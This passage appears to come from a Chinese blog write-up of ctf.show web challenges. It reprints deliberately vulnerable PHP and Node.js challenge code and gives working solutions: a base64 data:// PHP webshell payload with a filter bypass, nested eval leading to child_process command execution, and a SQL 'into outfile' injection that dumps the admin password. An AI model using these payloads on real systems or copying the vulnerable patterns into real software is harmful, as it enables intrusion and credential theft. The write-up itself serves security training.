                    $encode = &#39;data:image/jpg/png/gif;base64,&#39; . $ret;
                    file_put_contents(__DIR__.&#39;/../cache/&#39;.md5($value), $encode);
                &#125;
                $templateContent=str_replace(&#39;&#123;&#123;img:'.$key.'&#125;&#125;&#39;, $encode, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;
    public static function checkConfig($templateContent)&#123;
        $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
        foreach ($config as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;))&#123;
                $templateContent=str_replace(&#39;&#123;&#123;config:'.$key.'&#125;&#125;&#39;, $value, $templateContent);
            &#125;
            
        &#125;
        return $templateContent;
    &#125;

    public static function checkVar($templateContent,$arg)&#123;
        $db=new db();
        foreach ($arg as $key =&gt; $value) &#123;
            if(stripos($templateContent, &#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;))&#123;
                if(!preg_match(&#39;/\(|\[|\`|\&#39;|\$|\_|\&lt;|\?|\&quot;|\+|nginx|\)|\]|include|data|text|filter|input|file|GET|POST|COOKIE|SESSION|file/i&#39;, $value))&#123;
                    eval(&#39;$v=&#39;.$value.&#39;;&#39;);
                    $templateContent=str_replace(&#39;&#123;&#123;var:'.$key.'&#125;&#125;&#39;, $v, $templateContent);
                &#125;
                
            &#125;
        &#125;
        return $templateContent;
    &#125;

    public static function checkFoot($templateContent)&#123;
        if ( stripos($templateContent, &#39;&#123;&#123;cnzz&#125;&#125;&#39;)) &#123;
            $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
            $foot = $config[&#39;cnzz&#39;];
            if(is_file($foot))&#123;
                $foot=file_get_contents($foot);
                if(!preg_match(&#39;/&lt;|&gt;|\?|=|php|sess|log|phar|\.|\[|\&#123;|\(|_/&#39;, $foot))&#123;
                    include($foot);
                &#125;
                
            &#125;
            
        &#125;
        return $templateContent;
    &#125;
&#125;
</code></pre>
<p>&#x2F;api&#x2F;admin_settings.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-16 15:50:14
 Last Modified by:   h1xa
 Last Modified time: 2021-03-16 16:26:31
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();

error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
if($user)&#123;
    $config = unserialize(file_get_contents(__DIR__.&#39;/../config/settings&#39;));
    foreach ($_POST as $key =&gt; $value) &#123;
        $config[$key]=$value;
    &#125;
    file_put_contents(__DIR__.&#39;/../config/settings&#39;, serialize($config));
    $ret[&#39;msg&#39;]=&#39;管理员信息修改成功&#39;;
    die(json_encode($ret));

&#125;else&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;

</code></pre>
<p>&#x2F;api&#x2F;admin_templates.php</p>
<pre><code class="php">&lt;?php

/*
# -*- coding: utf-8 -*-
 Author: h1xa
 Date:   2021-03-19 18:49:54
 Last Modified by:   h1xa
 Last Modified time: 2021-03-25 17:17:07
 email: h1xa@ctfer.com
 link: https://ctfer.com

*/


session_start();
include(&#39;../render/db_class.php&#39;);
error_reporting(0);
$user= $_SESSION[&#39;user&#39;];
$ret = array(
        &quot;code&quot;=&gt;0,
        &quot;msg&quot;=&gt;&quot;查询失败&quot;,
        &quot;count&quot;=&gt;0,
        &quot;data&quot;=&gt;array()
    );
$action=$_GET[&#39;action&#39;];
if(!isset($user))&#123;
    $ret[&#39;msg&#39;]=&#39;请登录后使用此功能&#39;;
    die(json_encode($ret));
&#125;
switch ($action) &#123;
    case &#39;list&#39;:
        $sql = &quot;select id,name,type,path,des from templates limit 0,10&quot;;
        $db=new db();
        $temps = $db-&gt;select_array($sql);
        if(count($temps)&gt;0)&#123;
            $ret[&#39;count&#39;]=count($temps);
            $ret[&#39;data&#39;]=$temps;
            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
        &#125;
        break;
    case &#39;update&#39;:
        extract($_POST);
        $row=json_decode($row);
        if(waf($row))&#123;
            break;
        &#125;
        $sql =&quot;update templates set name=&#39;&#123;$row-&gt;name&#125;&#39;,path=&#39;&#123;$row-&gt;path&#125;&#39;,type=&#39;&#123;$row-&gt;type&#125;&#39;,des=&#39;&#123;$row-&gt;des&#125;&#39; where id =&#123;$row-&gt;id&#125;&quot;;
        $db = new db();
        if($db-&gt;update_one($sql))&#123;
            $ret[&#39;msg&#39;]=&#39;实时更新成功&#39;;
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;实时更新失败&#39;;
        &#125;
        break;
    case &#39;getContents&#39;:
        extract($_POST);
        $template=json_decode($template);
        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\\u4e00-\u9fa5]+$/&#39;, $template-&gt;path))&#123;
            $ret[&#39;count&#39;]=1;
            $ret[&#39;msg&#39;]=&#39;查询成功&#39;;
            $ret[&#39;data&#39;]=array(&#39;contents&#39;=&gt;htmlspecialchars(file_get_contents(__DIR__.&#39;/../templates/&#39;.$template-&gt;path)));
        &#125;
        break;
    case &#39;download&#39;:
        extract($_POST);
        if(preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\/\u4e00-\u9fa5]+$/&#39;, $path))&#123;
            header(&quot;Content-Type: application/octet-stream&quot;); 
            header(&#39;Content-Disposition:  attachment; filename=&quot;&#39; . $path. &#39;&quot;&#39;);
            echo file_get_contents(__DIR__.&#39;/../templates/&#39;.$path);
            exit();
        &#125;
        break;
    case &#39;upload&#39;:
        extract($_POST);
        if(!preg_match(&#39;/php|phar|ini|settings/i&#39;, $name))
        &#123;    
            if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;
                $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
            &#125;else&#123;
                file_put_contents(__DIR__.&#39;/../templates/&#39;.$name, $content);
                $ret[&#39;msg&#39;]=&#39;文件上传成功&#39;;
            &#125;
            
        &#125;else&#123;
            $ret[&#39;msg&#39;]=&#39;文件上传失败&#39;;
        &#125;
        break;
    default:
        # code...
        break;
&#125;

function waf($row)&#123;
    $ret = false;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;name))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;type))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;des))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;path))&#123;
        $ret=true;
    &#125;
    if(!preg_match(&#39;/^(?!_)(?!.*?_$)[a-zA-Z0-9_\u4e00-\u9fa5]+$/&#39;, $row-&gt;id))&#123;
        $ret=true;
    &#125;
    return $ret;
&#125;
die(json_encode($ret));
</code></pre>
<p>这次我们直接包含一个2.sml文件,其中内容换成</p>
<pre><code class="php">data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUW3pmXSk7Pz4x
</code></pre>
<p>但是需要绕过这行,简单使用数组绕过就好</p>
<pre><code class="php">if(preg_match(&#39;/&lt;|&gt;|\?|php|=|script|,|;|\(/i&#39;, $content))&#123;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182124982.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414182124982"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183409943.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414183409943"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182908939.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414182908939"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183420553.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414183420553"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183454050.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414183454050"></p>

<h1 id="web515"><a href="#web515" class="headerlink" title="web515"></a>web515</h1><pre><code class="php">
var express = require(&#39;express&#39;);
var _= require(&#39;lodash&#39;);
var router = express.Router();

/* GET users listing. */
router.get(&#39;/&#39;, function(req, res, next) &#123;
  res.render(&#39;index&#39;, &#123; title: &#39;æˆ‘æ˜¯å¤è¯»æœº&#39; &#125;);
&#125;);

router.post(&#39;/&#39;,function(req,res,next)&#123;
    if(req.body.user!=null)&#123;
        msg = req.body.user;
        if((msg.match(/proto|process|require|exec|var|&#39;|&quot;|:|\[|\]|[0-9]/))!==null || msg.length&gt;40)&#123;
              res.render(&#39;index&#39;, &#123; title: &#39;æ•æ„Ÿä¿¡æ¯ä¸å¤è¯»&#39; &#125;);
        &#125;else&#123;
            res.render(&#39;index&#39;, &#123; title: eval(msg) &#125;);
        &#125;
    &#125;else&#123;
        res.render(&#39;index&#39;, &#123; title: &#39;æˆ‘æ˜¯å¤è¯»æœº&#39; &#125;);
    &#125;
     
&#125;);
module.exports = router;
</code></pre>
<p>过滤了一些字符</p>
<p>我们采用eval嵌套</p>
<pre><code class="php">index.php?a=require( &#39;child_process&#39; ).spawnSync( &#39;ls&#39;,[&#39;/&#39;] ).stdout.toString()
POST
&#123;&quot;user&quot;:&quot;eval(req.query.a)&quot;&#125;
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414184559957.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414184559957"></p>

<h1 id="web516"><a href="#web516" class="headerlink" title="web516"></a>web516</h1><p>关键语句,不太懂js</p>
<pre><code>ctx.body=&#39;&lt;h3&gt;Hello &#39;+user[0].username+&#39;&lt;/h3&gt; your name is: &#39;+user[0].username+&#39; your id is: &#39;+user[0].id+ &#39; your password is: &#39;+eval(&#39;md5(&#39;+user[0].password+&#39;)&#39;);
</code></pre>
<pre><code class="php">2);const init=async()=&gt;&#123;await User.sequelize.query(&quot;select password from Users where username=&#39;admin&#39; into outfile &#39;/app/public/flag&#39;;&quot;,&#123;type:User.sequelize.SELECT&#125;);&#125;;init(
</code></pre>
<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185417494.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414185417494"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185459158.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414185459158"></p>

<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185522037.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" alt="image-20220414185522037"></p>


	</div>

	

	

	
		<div class="post-tags">
			<i class="fa fa-tags" aria-hidden="true"></i>
			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/ctf-show/" rel="tag">ctf.show</a>
		</div>
	
</article>

	<div id="share_container">
	<div id="share" data-initialized="true">
		<a class="no-pjax icon-wechat" tooltip="分享到微信">
			<button class="btn btn-icon btn-success">
				<span class="btn-inner--icon"><i class="fa fa-weixin"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-douban" tooltip="分享到豆瓣">
			<button class="btn btn-icon btn-primary" style="background: #209261;border: none;">
				豆
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-qq" tooltip="分享到 QQ">
			<button class="btn btn-icon btn-primary" style="background: #2196f3;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-qq"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-qzone" tooltip="分享到 QQ 空间">
			<button class="btn btn-icon btn-primary" style="background: #ffc107;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-star"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-weibo" tooltip="分享到微博">
			<button class="btn btn-icon btn-warning">
				<span class="btn-inner--icon"><i class="fa fa-weibo"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-facebook" tooltip="分享到 Facebook">
			<button class="btn btn-icon btn-primary" style="background: #283593;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-facebook"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-twitter" tooltip="分享到 Twitter">
			<button class="btn btn-icon btn-primary" style="background: #03a9f4;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=https://lovewanan.github.io/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/&text=中期测评" tooltip="分享到 Telegram">
			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
			</button>
		</a>
		<a target="_blank" class="no-pjax icon-copy-link" id="share_copy_link" tooltip="复制链接">
			<button class="btn btn-icon btn-default">
				<span class="btn-inner--icon"><i class="fa fa-link"></i></span>
			</button>
		</a>
	</div>
	<button id="share_show" class="btn btn-icon btn-primary" tooltip="分享">
		<span class="btn-inner--icon"><i class="fa fa-share"></i></span>
	</button>
</div>
<script type="text/javascript">
	socialShare("#share", {
	    title : '中期测评',
	    description : 'web486打开是一个登录


翻一下源码,没发现什么

注册之后登录也没有反应,重点并不是在这里
...',
	    wechatQrcodeTitle : "分享到微信",
	    wechatQrcodeHelper : '微信扫描二维码',
	    source : 'https://lovewanan.github.io/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/'
	});
	$("#share_show")[0].onclick = function(){
		$("#share_container").addClass("opened");
	};
	$("#share_copy_link")[0].onclick = function(){
		let input = document.createElement('input');
		document.body.appendChild(input);
		input.setAttribute("value", window.location.href);
		input.setAttribute("readonly", "readonly");
		input.setAttribute("style", "opacity: 0;mouse-events:none;");
		input.select();
		if (document.execCommand('copy')){
			iziToast.show({
				title: '链接已复制',
				message: "链接已复制到剪贴板",
				class: 'shadow',
				position: 'topRight',
				backgroundColor: '#2dce89',
				titleColor: '#ffffff',
				messageColor: '#ffffff',
				iconColor: '#ffffff',
				progressBarColor: '#ffffff',
				icon: 'fa fa-check',
				timeout: 5000
			});
		}else{
			iziToast.show({
				title: '复制失败',
				message: "请手动复制链接",
				class: 'shadow',
				position: 'topRight',
				backgroundColor: '#f5365c',
				titleColor: '#ffffff',
				messageColor: '#ffffff',
				iconColor: '#ffffff',
				progressBarColor: '#ffffff',
				icon: 'fa fa-close',
				timeout: 5000
			});
		}
		document.body.removeChild(input);
	};
</script>




	<div id="post_comment" class="card shadow-sm">
		<div id="waline"></div>
<script>
  Waline({
	el: '#waline',
	serverURL: 'https://waline-jaua9chtw-lovewanan.vercel.app',
  });
</script>

	</div>


<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/ctfshow/ctf.show/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="prev"> 代码审计</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/ctfshow/ctf.show/XXE/" rel="next"> XSS</a></div></div>




		
		
		
		

					<footer id="footer" class="site-footer card shadow-sm border-0">
						
						<div>Theme <a target="_blank" rel="noopener" href="https://github.com/solstice23/hexo-theme-argon"><strong>Argon</strong></a> | Powered by Hexo</div>
						<span id="busuanzi_container_site_uv">
							本站访客数 <span id="busuanzi_value_site_uv"></span> 人次
						</span>
					</footer>
				</main>
			</div>
		</div>
		
<script src="/argontheme.js"></script>

		
		
		

		
			<script>
				var argonEnableCodeHighlight = true;
			</script>
			
<link rel="stylesheet" href="/assets/vendor/highlight/styles/github-gist.css">

		

	</div>
</div>
<noscript>
	<style>
		article img.lazyload[src^="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPg"]{display: none;}
		.comment-item-text .comment-sticker.lazyload{display: none;}
	</style>
</noscript>
</body>



</html>

